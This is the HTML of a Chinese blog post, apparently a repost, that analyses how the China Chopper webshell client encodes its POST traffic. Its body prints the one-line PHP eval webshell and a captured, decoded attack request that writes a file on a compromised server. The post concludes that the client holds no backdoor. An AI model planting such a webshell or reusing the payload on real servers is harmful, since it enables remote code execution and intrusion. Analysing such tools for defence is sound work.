@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="一句话木马,中国菜刀,加密分析,后门," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。 说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。 其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。 一般">
+<meta name="keywords" content="一句话木马,中国菜刀,加密分析,后门">
+<meta property="og:type" content="article">
+<meta property="og:title" content="中国菜刀通讯加密分析『转载』">
+<meta property="og:url" content="http://yoursite.com/2011/08/08/中国菜刀通讯加密分析『转载』/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。 说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。 其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。 一般">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.262Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="中国菜刀通讯加密分析『转载』">
+<meta name="twitter:description" content="&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。 说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。 其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。 一般">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2011/08/08/中国菜刀通讯加密分析『转载』/"/>
+
+
+
+
+
+  <title>中国菜刀通讯加密分析『转载』 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2011/08/08/中国菜刀通讯加密分析『转载』/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">中国菜刀通讯加密分析『转载』</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2011-08-08T18:05:00+08:00">
+                2011-08-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><a href="/admin/ http:/www.letao.com/lianmeng/manage/linkImage.aspx?wh=570&amp;ht=60&amp;wid=108&amp;sid=duyihan"></a>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。</p>
+<p>说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。</p>
+<p>其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。</p>
+<p>一般POST到服务器的数据，就算加密过了，我们也能用echo $_POST[’pass’]的方法得到加密后的数据，</p>
+<p>所以我分析时在服务器上的“一句话”后面加了段代码，让所有$_POST[’pass’]的内容都各自保存到一个txt文本。</p>
+<p>但用菜刀执行一些操作后，发现服务端保存的txt文本里都只有一句代码：“@eval(base64_decode($_POST[z0]));”。</p>
+<p>这是它的加密手法之一：POST里包含POST，这样即使管理员发现一句话木马，也无法截取到你执行了什么代码。</p>
+<p>服务端突破基本无望，只能本地抓包了，下面这段代码是用抓包工具抓到新建文件的POST数据。(pass是一句话里的post变量名)</p>
+<p>pass=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO 0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEB md3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbIno yIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=RDpcXFdXV1xcd3d3XFxOZXdGaWxlLnR4dA%3D %3D&amp;z2=dGVzdA%3D%3D</p>
+<p>可以看到不止发送一个POST变量(POST变量用&amp;分割)，而一句话木马的POST执行的是$_POST[z0]，这是第二个POST的变量z0，</p>
+<p>可以看出z0变量经过base64_encode()加密，所以要先解密z0变量，用base64_decode()函数解密z0得到如下：</p>
+<p>@ini_set(“display_errors”,”0″);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-6 ?木??? ????蝌 ?? 恚????}A=MQl??t什???? 恚????}A=MQl??t中??????□???欠 ?木?</p>
+<p>只解密出了前三句代码，后面全是乱码，这里我找了一晚上都没找到问题出在哪，看起来加密代码应该没有问题，</p>
+<p>因为前面的pass变量可以看出是直接用base64_decode()解密用eval执行的，如果有经过其他加密处理就没无法执行代码了。</p>
+<p>直到第二天才发现问题所在，这是他的第二个加密手法：利用服务器接收POST数据时自动将经过url编码处理的字符串还原。</p>
+<p>各位仔细看z0变量里的加密代码，会发现有两个%符号，而base64编码是不支持%符号的，带%的一般是url编码。</p>
+<p>我把%2B和%3D用urldecode()函数还原分别是+号和=号，替换到加密代码里再用base64_decode()解密得到了完整代码：</p>
+<p>@ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(base64_decode($_POST[“z1”]),”w”),base64_decode($_POST[“z2”]))?”1″:”0″;; echo(“|&lt;-”);die();</p>
+<p>而在这段代码又包含了两个POST变量，$_POST[’z1’]和$_POST[’z2’]，这是第三层POST包含了，且也经过base64加密和url编码。</p>
+<p>从先前抓的数据包找到这两个变量，先还原里面的url编码字符，再用base64_decode()解密，得到如下</p>
+<p>z1=D:\WWW\www\NewFile.txt //新建文件保存路径 z2=test //新建文件内容</p>
+<p>到这里我们才算真正将$_POST[’pass’]里的代码完全还原出来了。</p>
+<p>@ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(“D:\WWW\www\NewFile.txt”,”w”),”test”)?”1″:”0″;; echo(“|&lt;-”);die();</p>
+<p>eval执行的就是上面的代码。</p>
+<p>其他如编辑，复制等操作也是一样的加密手法，我已经将他们全部还原成明文，并没有发现所谓的后门，</p>
+<p>对菜刀客户端也进行了两个多小时的抓包监听，也无任何自动执行动作</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/一句话木马/" rel="tag"># 一句话木马</a>
+          
+            <a href="/tags/中国菜刀/" rel="tag"># 中国菜刀</a>
+          
+            <a href="/tags/加密分析/" rel="tag"># 加密分析</a>
+          
+            <a href="/tags/后门/" rel="tag"># 后门</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2011/08/09/全价87元人名币的的网站/" rel="prev" title="全价87元人名币的的网站">
+                全价87元人名币的的网站 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
